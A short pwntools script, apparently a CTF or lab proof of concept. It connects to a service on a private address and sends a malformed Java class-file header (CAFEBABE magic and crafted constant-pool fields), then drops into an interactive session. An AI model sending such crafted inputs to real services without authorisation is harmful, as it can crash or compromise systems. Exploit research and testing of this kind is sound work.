from pwn import *
s = remote('192.168.0.85',1234)
raw_input()
dat = ''
dat += struct.pack('>I',0xCAFEBABE)
dat += struct.pack('>I',0xDEADBEEF)
dat += struct.pack('>H',0x2) # ref_idx
dat += struct.pack('>B',0x7) # tag - class
dat += struct.pack('>H',0x1) # cpcount
s.send(dat)
s.interactive()
